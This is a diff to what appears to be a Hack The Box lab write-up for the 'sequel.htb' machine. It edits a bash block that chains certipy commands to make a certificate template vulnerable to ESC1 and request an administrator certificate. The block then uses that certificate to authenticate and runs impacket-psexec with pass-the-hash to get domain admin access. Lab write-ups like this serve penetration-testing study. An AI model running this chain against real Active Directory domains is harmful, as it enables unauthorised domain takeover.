@@ -275,7 +275,9 @@ certipy shadow auto -username ryan@sequel.htb -password <PASSWORD> -account ca_s
 ```bash
 certipy find -dc-ip <IP> -u ca_svc -hashes <NTLM> -stdout -vuln # FInd the which certificate is vulnerable
 certipy template -dc-ip <IP> -u ca_svc -hashes <NTLM> -template <TEMPLATE_NAME> -write-default-configuration # Make this vulnerable to ESC1
-certipy req -u ca_svc -hashes <NTLM> -ca <CA Name> -template <TEMPLATE_NAME> -upn administrator@sequal.htb -target dc01.sequel.htb -target-ip <IP> # Rerun commands one more time then it's generate the administrator.pfx, if .pfx file is not generate run this few times, If the -vuln command shows the ESC1 vulnerable it generating the .pfx file
+certipy find -dc-ip <IP> -u ca_svc -hashes <NTLM> -stdout -vuln # Now it shows vulnerable to ESC1
+certipy req -u ca_svc -hashes <NTLM> -ca <CA Name> -template <TEMPLATE_NAME> -upn administrator@sequal.htb -target dc01.sequel.htb -target-ip <IP> # Rerun commands one more time then it's generate the
+administrator.pfx, if .pfx file is not generate run this few times, If the -vuln command shows the ESC1 vulnerable it generating the .pfx file
 certipy auth -pfx administrator.pfx -dc-ip <IP>
 impacket-psexec -hashes <LM>:<NTLM> administrator@<IP>
 ```
